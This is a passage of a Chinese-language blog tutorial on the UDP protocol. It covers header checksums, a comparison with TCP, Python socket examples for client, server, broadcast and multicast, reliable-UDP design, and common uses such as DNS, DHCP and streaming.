&quot;HELLO&quot; (5字节)<br>长度 =<span class="hljs-number"> 8 </span>+<span class="hljs-number"> 5 </span>=<span class="hljs-number"> 13 </span>字节<br></code></pre></td></tr></table></figure><p><strong>4. 校验和（Checksum，16位）</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">作用：检测UDP数据报在传输中是否出错<br>范围：0 ~ 65535<br>可选：IPv4中可以不使用（设置为0）<br>必须：IPv6中必须使用<br><br>校验范围：<br><span class="hljs-bullet">- </span>UDP伪头部（来自IP层）<br><span class="hljs-bullet">- </span>UDP头部<br><span class="hljs-bullet">- </span>UDP数据<br><br>如果校验失败 → 丢弃该数据报<br></code></pre></td></tr></table></figure><h3 id="2-4-UDP伪头部"><a href="#2-4-UDP伪头部" class="headerlink" title="2.4 UDP伪头部"></a>2.4 UDP伪头部</h3><p><strong>为什么需要伪头部？</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">问题：<br><span class="hljs-symbol">UDP</span>校验和只校验UDP段本身<br>如果<span class="hljs-built_in">IP</span>头部的源地址或目标地址被篡改<br><span class="hljs-symbol">UDP</span>无法检测到<br><br>解决：<br><span class="hljs-symbol">UDP</span>校验和包含<span class="hljs-built_in">IP</span>层的部分信息（伪头部）<br></code></pre></td></tr></table></figure><p><strong>伪头部结构（IPv4）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                        源IP地址 (32位)                         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                       目标IP地址 (32位)                        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|    零 (8位)    | 协议 (8位)    |        UDP长度 (16位)          |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>零：填充字节，值为0<br>协议：17（UDP的协议号）<br>UDP长度：UDP头部+数据的长度<br><br>注意：伪头部只用于校验和计算，不实际传输<br></code></pre></td></tr></table></figure><hr><h2 id="3-UDP-vs-TCP-深入对比"><a href="#3-UDP-vs-TCP-深入对比" class="headerlink" title="3. UDP vs TCP 深入对比"></a>3. UDP vs TCP 深入对比</h2><h3 id="3-1-详细对比表"><a href="#3-1-详细对比表" class="headerlink" title="3.1 详细对比表"></a>3.1 详细对比表</h3><table><thead><tr><th>特性</th><th>UDP</th><th>TCP</th></tr></thead><tbody><tr><td><strong>连接</strong></td><td>无连接</td><td>面向连接（三次握手&#x2F;四次挥手）</td></tr><tr><td><strong>可靠性</strong></td><td>不可靠（尽力而为）</td><td>可靠（确认+重传）</td></tr><tr><td><strong>顺序</strong></td><td>不保证顺序</td><td>保证顺序</td></tr><tr><td><strong>流量控制</strong></td><td>无</td><td>有（滑动窗口）</td></tr><tr><td><strong>拥塞控制</strong></td><td>无</td><td>有（慢启动、拥塞避免）</td></tr><tr><td><strong>头部开销</strong></td><td>8字节</td><td>20-60字节</td></tr><tr><td><strong>速度</strong></td><td>快</td><td>相对慢</td></tr><tr><td><strong>数据边界</strong></td><td>保留（数据报）</td><td>不保留（字节流）</td></tr><tr><td><strong>广播&#x2F;组播</strong></td><td>支持</td><td>不支持</td></tr><tr><td><strong>连接数</strong></td><td>无限制</td><td>受系统资源限制</td></tr><tr><td><strong>应用场景</strong></td><td>实时、简单请求</td><td>可靠传输</td></tr></tbody></table><h3 id="3-2-性能对比"><a href="#3-2-性能对比" class="headerlink" title="3.2 性能对比"></a>3.2 性能对比</h3><p><strong>延迟对比</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCP首次通信：<br><span class="hljs-bullet">1.</span> 三次握手：1.5 RTT<br><span class="hljs-bullet">2.</span> 数据传输：1 RTT<br><span class="hljs-bullet">3.</span> 四次挥手：2 RTT<br>总延迟：4.5 RTT<br><br>UDP首次通信：<br><span class="hljs-bullet">1.</span> 直接发送数据：1 RTT<br>总延迟：1 RTT<br><br>示例（RTT=50ms）：<br>TCP首次请求：225ms<br>UDP首次请求：50ms<br>UDP快 4.5 倍！<br></code></pre></td></tr></table></figure><p><strong>吞吐量对比</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">相同带宽下：<br>UDP：<br><span class="hljs-bullet">- </span>无流量控制<br><span class="hljs-bullet">- </span>无拥塞控制<br><span class="hljs-bullet">- </span>理论上可以占满带宽<br><br>TCP：<br><span class="hljs-bullet">- </span>慢启动阶段较慢<br><span class="hljs-bullet">- </span>拥塞控制限制速度<br><span class="hljs-bullet">- </span>实际吞吐量 &lt; 带宽<br><br>但是：<br>TCP保证可靠传输<br>UDP可能大量丢包（尤其是拥塞时）<br></code></pre></td></tr></table></figure><h3 id="3-3-使用场景对比"><a href="#3-3-使用场景对比" class="headerlink" title="3.3 使用场景对比"></a>3.3 使用场景对比</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs armasm">┌─────────────────────────────────────────────────┐<br>│          场景选择决策树                          │<br>└─────────────────────────────────────────────────┘<br><br>                   开始<br>                    ↓<br>         需要可靠传输？<br>            ↙      ↘<br>          是        否<br>          ↓         ↓<br>        TCP    实时性重要？<br>                ↙      ↘<br>              是        否<br>              ↓         ↓<br>            UDP    数据量小？<br>                    ↙      ↘<br>                  是        否<br>                  ↓         ↓<br>                UDP       TCP<br><br>具体场景：<br><br><span class="hljs-symbol">TCP</span>：<br>✅ HTTP/HTTPS（网页浏览）<br>✅ FTP（文件传输）<br>✅ SMTP/POP3/IMAP（邮件）<br>✅ SSH/Telnet（远程登录）<br>✅ 数据库连接<br><br><span class="hljs-symbol">UDP</span>：<br>✅ DNS（域名查询）<br>✅ DHCP（<span class="hljs-built_in">IP</span>地址分配）<br>✅ 视频直播<br>✅ 语音通话（VoIP）<br>✅ 网络游戏<br>✅ NTP（时间同步）<br>✅ SNMP（网络管理）<br>✅ TFTP（简单文件传输）<br></code></pre></td></tr></table></figure><hr><h2 id="4-UDP编程"><a href="#4-UDP编程" class="headerlink" title="4. UDP编程"></a>4. UDP编程</h2><h3 id="4-1-UDP-Socket-API"><a href="#4-1-UDP-Socket-API" class="headerlink" title="4.1 UDP Socket API"></a>4.1 UDP Socket API</h3><p><strong>服务器端流程</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> socket()     <span class="hljs-comment"># 创建UDP socket</span><br><span class="hljs-number">2.</span> bind()       <span class="hljs-comment"># 绑定到本地地址和端口</span><br><span class="hljs-number">3.</span> recvfrom()   <span class="hljs-comment"># 接收数据（阻塞等待）</span><br><span class="hljs-number">4.</span> sendto()     <span class="hljs-comment"># 发送响应</span><br><span class="hljs-number">5.</span> close()      <span class="hljs-comment"># 关闭socket</span><br></code></pre></td></tr></table></figure><p><strong>客户端流程</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> socket()     <span class="hljs-comment"># 创建UDP socket</span><br><span class="hljs-number">2.</span> sendto()     <span class="hljs-comment"># 发送数据到服务器</span><br><span class="hljs-number">3.</span> recvfrom()   <span class="hljs-comment"># 接收响应</span><br><span class="hljs-number">4.</span> close()      <span class="hljs-comment"># 关闭socket</span><br></code></pre></td></tr></table></figure><p><strong>关键区别</strong>：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">UDP</span> <span class="hljs-variable">vs</span> <span class="hljs-variable">TCP</span> <span class="hljs-variable">Socket</span>：<br><br><span class="hljs-variable">TCP</span>：<br>- <span class="hljs-function"><span class="hljs-title">connect</span>() 建立连接</span><br><span class="hljs-function">- <span class="hljs-title">send</span>()/<span class="hljs-title">recv</span>() 发送/接收数据</span><br><span class="hljs-function">- 不需要指定目标地址（已连接）</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-variable">UDP</span>：</span><br><span class="hljs-function">- 不需要 <span class="hljs-title">connect</span>()</span><br>- <span class="hljs-function"><span class="hljs-title">sendto</span>()/<span class="hljs-title">recvfrom</span>() 每次都要指定地址</span><br><span class="hljs-function">- 可以与多个对端通信</span><br></code></pre></td></tr></table></figure><h3 id="4-2-UDP服务器示例"><a href="#4-2-UDP服务器示例" class="headerlink" title="4.2 UDP服务器示例"></a>4.2 UDP服务器示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># 创建UDP socket</span><br>server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># 绑定地址和端口</span><br>server_address = (<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>server_socket.bind(server_address)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;UDP服务器启动在 <span class="hljs-subst">&#123;server_address&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 接收数据（阻塞）</span><br>    data, client_address = server_socket.recvfrom(<span class="hljs-number">4096</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;收到来自 <span class="hljs-subst">&#123;client_address&#125;</span> 的数据: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 发送响应</span><br>    response = <span class="hljs-string">f&quot;服务器已收到: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span><br>    server_socket.sendto(response.encode(), client_address)<br></code></pre></td></tr></table></figure><h3 id="4-3-UDP客户端示例"><a href="#4-3-UDP客户端示例" class="headerlink" title="4.3 UDP客户端示例"></a>4.3 UDP客户端示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># 创建UDP socket</span><br>client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># 服务器地址</span><br>server_address = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br><span class="hljs-comment"># 发送数据</span><br>message = <span class="hljs-string">&quot;Hello UDP Server!&quot;</span><br>client_socket.sendto(message.encode(), server_address)<br><br><span class="hljs-comment"># 接收响应</span><br>data, server = client_socket.recvfrom(<span class="hljs-number">4096</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;收到服务器响应: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 关闭socket</span><br>client_socket.close()<br></code></pre></td></tr></table></figure><h3 id="4-4-UDP特性示例"><a href="#4-4-UDP特性示例" class="headerlink" title="4.4 UDP特性示例"></a>4.4 UDP特性示例</h3><p><strong>示例1：数据报边界</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># TCP（字节流）</span><br>tcp_socket.send(<span class="hljs-string">b&quot;Hello&quot;</span>)<br>tcp_socket.send(<span class="hljs-string">b&quot;World&quot;</span>)<br><span class="hljs-comment"># 接收方可能一次性收到 &quot;HelloWorld&quot;</span><br><br><span class="hljs-comment"># UDP（数据报）</span><br>udp_socket.sendto(<span class="hljs-string">b&quot;Hello&quot;</span>, addr)<br>udp_socket.sendto(<span class="hljs-string">b&quot;World&quot;</span>, addr)<br><span class="hljs-comment"># 接收方分两次收到 &quot;Hello&quot; 和 &quot;World&quot;</span><br></code></pre></td></tr></table></figure><p><strong>示例2：广播</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建UDP socket</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># 启用广播</span><br>sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 发送广播消息</span><br>broadcast_address = (<span class="hljs-string">&#x27;255.255.255.255&#x27;</span>, <span class="hljs-number">9999</span>)<br>message = <span class="hljs-string">&quot;Broadcast Message&quot;</span><br>sock.sendto(message.encode(), broadcast_address)<br></code></pre></td></tr></table></figure><p><strong>示例3：组播</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-comment"># 创建UDP socket</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br><span class="hljs-comment"># 组播地址</span><br>multicast_group = <span class="hljs-string">&#x27;224.0.0.1&#x27;</span><br>multicast_port = <span class="hljs-number">9999</span><br><br><span class="hljs-comment"># 加入组播组</span><br>group = socket.inet_aton(multicast_group)<br>mreq = struct.pack(<span class="hljs-string">&#x27;4sL&#x27;</span>, group, socket.INADDR_ANY)<br>sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)<br><br><span class="hljs-comment"># 绑定端口</span><br>sock.bind((<span class="hljs-string">&#x27;&#x27;</span>, multicast_port))<br><br><span class="hljs-comment"># 接收组播消息</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data, address = sock.recvfrom(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;收到组播消息: <span class="hljs-subst">&#123;data.decode()&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="5-基于UDP实现可靠传输"><a href="#5-基于UDP实现可靠传输" class="headerlink" title="5. 基于UDP实现可靠传输"></a>5. 基于UDP实现可靠传输</h2><h3 id="5-1-为什么要在UDP上实现可靠传输？"><a href="#5-1-为什么要在UDP上实现可靠传输？" class="headerlink" title="5.1 为什么要在UDP上实现可靠传输？"></a>5.1 为什么要在UDP上实现可靠传输？</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UDP的问题：<br>❌ 数据可能丢失<br>❌ 数据可能乱序<br>❌ 数据可能重复<br><br>但UDP的优势：<br>✅ 延迟低<br>✅ 可以定制可靠性机制<br>✅ 避免TCP的固有限制<br><br>解决方案：<br>在应用层实现可靠传输机制<br><span class="hljs-section">= UDP的速度 + 自定义的可靠性</span><br></code></pre></td></tr></table></figure><h3 id="5-2-可靠UDP的实现要点"><a href="#5-2-可靠UDP的实现要点" class="headerlink" title="5.2 可靠UDP的实现要点"></a>5.2 可靠UDP的实现要点</h3><p><strong>1. 序列号</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">每个数据包添加序列号<br><br>数据包格式：<br>┌─────────────────────────────────┐<br>│ 序列号 (<span class="hljs-number">4</span>字节)                   │<br>├─────────────────────────────────┤<br>│ 数据                             │<br>└─────────────────────────────────┘<br><br>作用：<br>- 检测丢包（序列号跳跃）<br>- 检测重复（相同序列号）<br>- 重排序（按序列号排序）<br></code></pre></td></tr></table></figure><p><strong>2. 确认机制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">接收方发送ACK确认<br><br>ACK包格式：<br>┌─────────────────────────────────┐<br>│ ACK标志 (<span class="hljs-number">1</span>字节)                  │<br>├─────────────────────────────────┤<br>│ 确认序列号 (<span class="hljs-number">4</span>字节)               │<br>└─────────────────────────────────┘<br><br>策略：<br>- 累积确认：ACK=n表示已收到n之前的所有包<br>- 选择确认：类似TCP的SACK<br></code></pre></td></tr></table></figure><p><strong>3. 超时重传</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">发送方：<br><span class="hljs-number">1.</span> 发送数据包<br><span class="hljs-number">2.</span> 启动定时器<br><span class="hljs-number">3.</span> 等待ACK<br>   - 收到ACK：取消定时器<br>   - 超时：重传数据包<br><br>RTO计算：<br>可以使用简化的算法<br>RTO = α × RTT<br>α = <span class="hljs-number">1.5</span>~<span class="hljs-number">2.0</span><br></code></pre></td></tr></table></figure><p><strong>4. 窗口机制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">滑动窗口：<br>- 限制未确认的数据包数量<br>- 提高传输效率<br><br>示例：<br>窗口大小 = <span class="hljs-number">4</span><br><br>发送序列：<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span><br>收到ACK(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>可以发送：<span class="hljs-number">5</span>, <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h3 id="5-3-可靠UDP协议示例（RUDP）"><a href="#5-3-可靠UDP协议示例（RUDP）" class="headerlink" title="5.3 可靠UDP协议示例（RUDP）"></a>5.3 可靠UDP协议示例（RUDP）</h3><p><strong>协议设计</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs armasm">数据包格式：<br>┌─────────────────────────────────┐<br>│ 类型 (<span class="hljs-number">1</span>字节)                     │  <span class="hljs-meta">DATA</span>/ACK/FIN<br>│ 序列号 (<span class="hljs-number">4</span>字节)                   │<br>│ 校验和 (<span class="hljs-number">4</span>字节)                   │<br>│ 数据长度 (<span class="hljs-number">2</span>字节)                 │<br>├─────────────────────────────────┤<br>│ 数据                             │<br>└─────────────────────────────────┘<br><br>特性：<br>✅ 序列号：检测丢包和乱序<br>✅ ACK：确认机制<br>✅ 超时重传：保证可靠性<br>✅ 滑动窗口：提高效率<br>✅ 校验和：检测错误<br></code></pre></td></tr></table></figure><p><strong>实际应用</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">KCP协议（快速可靠协议）：<br><span class="hljs-bullet">- </span>由云风开发<br><span class="hljs-bullet">- </span>游戏行业广泛使用<br><span class="hljs-bullet">- </span>比TCP快30%-40%<br><span class="hljs-bullet">- </span>实现了ARQ（自动重传请求）<br><br>QUIC协议（Quick UDP Internet Connections）：<br><span class="hljs-bullet">- </span>Google开发<br><span class="hljs-bullet">- </span>HTTP/3的基础<br><span class="hljs-bullet">- </span>0-RTT连接建立<br><span class="hljs-bullet">- </span>更好的拥塞控制<br><span class="hljs-bullet">- </span>已标准化为RFC 9000<br></code></pre></td></tr></table></figure><hr><h2 id="6-UDP常见应用"><a href="#6-UDP常见应用" class="headerlink" title="6. UDP常见应用"></a>6. UDP常见应用</h2><h3 id="6-1-DNS查询"><a href="#6-1-DNS查询" class="headerlink" title="6.1 DNS查询"></a>6.1 DNS查询</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">为什么DNS使用UDP？<br><br><span class="hljs-bullet">1.</span> 请求-响应模式<br><span class="hljs-bullet">   -</span> 单个请求，单个响应<br><span class="hljs-bullet">   -</span> 适合无连接<br><br><span class="hljs-bullet">2.</span> 数据量小<br><span class="hljs-bullet">   -</span> 大部分查询和响应 &lt; 512字节<br><span class="hljs-bullet">   -</span> 单个UDP包可以容纳<br><br><span class="hljs-bullet">3.</span> 速度快<br><span class="hljs-bullet">   -</span> 无需建立连接<br><span class="hljs-bullet">   -</span> 减少延迟<br><br><span class="hljs-bullet">4.</span> 超时重试简单<br><span class="hljs-bullet">   -</span> 应用层自己控制<br><br>注意：<br><span class="hljs-bullet">-</span> 响应 &gt; 512字节时会使用TCP<br><span class="hljs-bullet">-</span> DNSSEC可能需要更大的包<br></code></pre></td></tr></table></figure><h3 id="6-2-DHCP"><a href="#6-2-DHCP" class="headerlink" title="6.2 DHCP"></a>6.2 DHCP</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">为什么DHCP使用UDP？<br><br><span class="hljs-bullet">1.</span> 客户端还没有IP地址<br><span class="hljs-bullet">   -</span> 无法建立TCP连接<br><span class="hljs-bullet">   -</span> UDP可以使用广播<br><br><span class="hljs-bullet">2.</span> 简单的请求-响应<br><span class="hljs-bullet">   -</span> 4个包（DORA）完成<br><span class="hljs-bullet">   -</span> 不需要复杂的连接管理<br><br><span class="hljs-bullet">3.</span> 允许广播<br><span class="hljs-bullet">   -</span> 客户端广播Discover<br><span class="hljs-bullet">   -</span> UDP支持广播<br></code></pre></td></tr></table></figure><h3 id="6-3-流媒体"><a href="#6-3-流媒体" class="headerlink" title="6.3 流媒体"></a>6.3 流媒体</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">为什么流媒体使用UDP？<br><br><span class="hljs-bullet">1.</span> 实时性优先<br><span class="hljs-bullet">   -</span> 宁可跳帧也不要延迟<br><span class="hljs-bullet">   -</span> TCP重传会增加延迟<br><br><span class="hljs-bullet">2.</span> 可以容忍丢包<br><span class="hljs-bullet">   -</span> 视频丢几帧影响不大<br><span class="hljs-bullet">   -</span> 音频可以插值补偿<br><br><span class="hljs-bullet">3.</span> 吞吐量高<br><span class="hljs-bullet">   -</span> 无拥塞控制<br><span class="hljs-bullet">   -</span> 可以快速传输<br><br>协议示例：<br><span class="hljs-bullet">-</span> RTP（实时传输协议）<br><span class="hljs-bullet">-</span> RTCP（RTP控制协议）<br><span class="hljs-bullet">-</span> 